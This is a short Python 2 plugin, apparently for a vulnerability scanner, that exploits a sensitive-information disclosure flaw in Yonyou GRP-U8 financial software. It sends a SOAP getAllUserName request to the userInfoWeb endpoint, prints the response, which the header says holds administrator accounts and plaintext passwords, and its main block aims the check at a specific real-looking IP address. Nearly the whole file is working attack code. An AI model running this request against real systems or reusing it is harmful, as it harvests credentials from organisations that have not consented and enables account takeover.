#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = 烽火戏诸侯
#_PlugName_ = 用友GRP-U8 财务管理软件userInfoWeb接口敏感信息泄露漏洞(可获取管理账号，明文密码)
#references:http://www.wooyun.org/bugs/wooyun-2010-0111399

def assign(service, arg):
    if service == "yongyou_u8":
        return True, arg

def audit(arg):
    vulurl='{url}services/userInfoWeb'.format(url=arg)
    header = 'SOAPAction: ""'
    data = """<soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ser="http://service.pt.midas.ufgov.com">
   <soapenv:Header/>
   <soapenv:Body>
      <ser:getAllUserName soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
         <sYear xsi:type="xsd:string">?</sYear>
      </ser:getAllUserName>
   </soapenv:Body>
</soapenv:Envelope>"""
    code, head,res, errcode, _   = curl.curl2(vulurl,header=header,post=data)
    print res
    if  code ==   200 and 'password xsi:type=' in res:
        security_hole(vulurl)

if __name__ == '__main__':
    from dummy import *
    audit(assign('yongyou_u8', 'http://203.86.55.104/')[1])